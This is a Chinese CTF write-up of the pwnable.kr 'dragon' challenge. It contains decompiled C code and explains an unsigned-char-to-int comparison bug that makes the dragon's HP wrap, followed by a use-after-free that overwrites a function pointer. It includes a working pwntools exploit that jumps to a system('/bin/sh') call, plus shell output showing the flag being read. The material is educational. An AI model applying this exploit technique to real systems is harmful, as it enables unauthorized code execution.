---
title: pwnable.kr-dragon
date: 2018-02-27 17:37:30
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
这道题找溢出找了半天，游戏也玩了半天，唉最后还是细心读代码找出了漏洞。这是一个c语言不同类型比较隐式转换导致的漏洞，还是有点意思的。
# 分析
放ida逆向一下，程序代码逻辑有点长，不过认真读的话还是能理解的。
```c
int PlayGame()
{
  int result; // eax@1

  while ( 1 )
  {
    while ( 1 )
    {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      result = GetChoice();
      if ( result != 1 && result != 2 )
        break;
      FightDragon(result);
    }
    if ( result != 3 )
      break;
    SecretLevel();
  }
  return result;
}
```
```c
void __cdecl FightDragon(int a1)
{
  char v1; // al@1
  void *v2; // ST1C_4@10
  int v3; // [sp+10h] [bp-18h]@7
  _DWORD *ptr; // [sp+14h] [bp-14h]@1
  _DWORD *v5; // [sp+18h] [bp-10h]@1

  ptr = malloc(0x10u);
  v5 = malloc(0x10u);
  v1 = Count++;
  if ( v1 & 1 )
  {
    v5[1] = 1;
    *((_BYTE *)v5 + 8) = 80;
    *((_BYTE *)v5 + 9) = 4;
    v5[3] = 10;
    *v5 = PrintMonsterInfo;
    puts("Mama Dragon Has Appeared!");
  }
  else
  {
    v5[1] = 0;
    *((_BYTE *)v5 + 8) = 50;
    *((_BYTE *)v5 + 9) = 5;
    v5[3] = 30;
    *v5 = PrintMonsterInfo;
    puts("Baby Dragon Has Appeared!");
  }
  if ( a1 == 1 )
  {
    *ptr = 1;
    ptr[1] = 42;
    ptr[2] = 50;
    ptr[3] = PrintPlayerInfo;
    v3 = PriestAttack((int)ptr, v5);
  }
  else
  {
    if ( a1 != 2 )
      return;
    *ptr = 2;
    ptr[1] = 50;
    ptr[2] = 0;
    ptr[3] = PrintPlayerInfo;
    v3 = KnightAttack((int)ptr, v5);
  }
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(ptr);
}
```
```c
int __cdecl PriestAttack(int a1, void *ptr)
{
  int v2; // eax@1

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);
    (*(void (__cdecl **)(int))(a1 + 12))(a1);
    v2 = GetChoice();
    switch ( v2 )
    {
      case 2:
        puts("Clarity! Your Mana Has Been Refreshed");
        *(_DWORD *)(a1 + 8) = 50;
        printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
        *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
        printf("And The Dragon Heals %d HP!\n", *((_BYTE *)ptr + 9));
        *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        break;
      case 3:
        if ( *(_DWORD *)(a1 + 8) <= 24 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", *((_BYTE *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
          *(_DWORD *)(a1 + 8) -= 25;
        }
        break;
      case 1:
        if ( *(_DWORD *)(a1 + 8) <= 9 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);
          *((_BYTE *)ptr + 8) -= 20;
          *(_DWORD *)(a1 + 8) -= 10;
          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
          printf("And The Dragon Heals %d HP!\n", *((_BYTE *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        }
        break;
    }
    if ( *(_DWORD *)(a1 + 4) <= 0 )
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((_BYTE *)ptr + 8) > 0 );
  free(ptr);
  return 1;
}
```
```c
int SecretLevel()
{
  char s1; // [sp+12h] [bp-16h]@1
  int v2; // [sp+1Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf("%10s", &s1);
  if ( strcmp(&s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
  return *MK_FP(__GS__, 20) ^ v2;
}
```
贴了几个关键的函数反编译代码，程序逻辑就不细说了，下面只记录关键部分。
在`SecretLevel`函数中有一段执行shell的代码，但是没办法绕过判断。程序的漏洞在`PriestAttack`函数内，该函数在怪物的血量不大于0时跳出循环，但是记录怪物血量的变量是`BYTE`类型的，也就是`unsigned char`类型。与它比较的0默认情况是`signed int`。
在c语言中不同类型的变量做比较会进行隐式类型转换，短长度类型会向较长长度类型转换，长度一致符号不同则向无符号转换，整数会向float转换，float会向double转换。这些网上都能搜到，所以就不继续说了。
那么这里的比较，`BYTE`就会向`signed int`转换。如果此时怪物血量为`128`,转换为二进制就是`10000000`,那么进行符号扩展时就变成了`0xffffff80`,而这个数其符号位为`1`所以是个负数，那么函数就会跳出循环并返回`1`。然而使怪物的血量达到`128`是可行的，可以使用第一个英雄挑战`Mama Dragon`，每个回合配合使用`3`和`2`技能使怪物自动增长血量，最后就能使怪物血量达到128。
接下来就是游戏胜利的判断了。
```c
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);
  }
```
进入该判断后，由于在前面的函数中`v5`这个堆指针已经释放了但是没有置0，这里马上又申请了一个大小一样的堆空间，那么根据glibc的堆分配策略这里的`v2`会引用之前`v5`指向的堆，接下来`v2`的内容可控下面又有`v5`函数的调用，所以就可以写入任意地址来执行了。这里算是一个`UAF`漏洞。
知道了利用方法下面给出exp
```python
from pwn import *

def work(DEBUG):
    context(arch='i386',os='linux',log_level='info')
    if DEBUG:
        r = process('./dragon')
    else:
        r = remote('pwnable.kr',9004)
        
    target_addr = 0x08048dbf
    
    r.send("1\n"*3+'1\n'+"3\n3\n2\n"*4)
    r.recvuntil("You As:\n")
    r.sendline(p32(target_addr))
    r.interactive()

work(False)
```
```bash
root@1:~/桌面/test$ python 1.py
[+] Opening connection to pwnable.kr on port 9004: Done
[*] Switching to interactive mode
And The Dragon You Have Defeated Was Called:
$ ls
dragon
flag
log
super.pl
$ cat flag
MaMa, Gandhi was right! :)
$ 
```
# 总结
在c语言编码时得注意不同类型变量的比较，很有可能在隐式转换时造成漏洞。